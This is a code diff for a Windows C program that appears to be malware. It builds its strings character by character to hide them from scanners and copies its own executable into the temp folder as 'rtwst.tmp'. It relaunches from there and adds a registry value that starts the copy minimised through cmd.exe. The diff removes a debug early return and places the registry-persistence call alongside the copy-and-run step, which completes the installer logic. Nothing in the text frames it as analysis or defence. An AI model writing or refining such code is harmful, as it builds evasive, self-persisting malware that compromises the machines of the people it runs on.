@@ -375,7 +375,7 @@ int SetupRegistryKey(const char* execPath)
 	char ca_command[] = { 'c','m','d','.','e','x','e',' ','/','s',' ','/','c',' ','s','t','a','r','t',' ','"','"',' ','/','m','i','n',' ',0 };
 	size_t lenCommand = strlen(ca_command) + 1;
 	size_t lenExecPath = strlen(execPath) + 1;
-	int lenRegValue = lenCommand + lenExecPath;
+	size_t lenRegValue = lenCommand + lenExecPath;
 	char* regValue = (char*)calloc(lenRegValue, sizeof(char));
 	strncpy_s(regValue, lenRegValue, ca_command, lenCommand);
 	strncat_s(regValue, lenRegValue, execPath, lenExecPath);
@@ -409,6 +409,14 @@ WinMain(HINSTANCE hInstance,
 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
 	
+	char currentPath[MAX_PATH];
+	if ( GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0 )
+	{
+#if DEBUG
+		OutputDebugStringA("Failed getting the module file name.");
+#endif		
+	}
+
 	char tempPath[MAX_PATH] = {};
 
 	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
@@ -418,18 +426,6 @@ WinMain(HINSTANCE hInstance,
 	char execPath[MAX_PATH + 9] = {};
 	strncpy_s(execPath, MAX_PATH, tempPath, strlen(tempPath));
 	strncat_s(execPath, "rtwst.tmp", 9);
-	
-	SetupRegistryKey(execPath);
-	
-	return 0;
-	
-	char currentPath[MAX_PATH];
-	if ( GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0 )
-	{
-#if DEBUG
-		OutputDebugStringA("Failed getting the module file name.");
-#endif		
-	}
 
 #if DEBUG	
 	if ( 0 )
@@ -437,6 +433,7 @@ WinMain(HINSTANCE hInstance,
 	if ( strcmp(currentPath, execPath) != 0 )
 #endif
 	{
+		SetupRegistryKey(execPath);
 		CopyAndRunFromTempFolder(currentPath, execPath);
 		return 0;
 	}
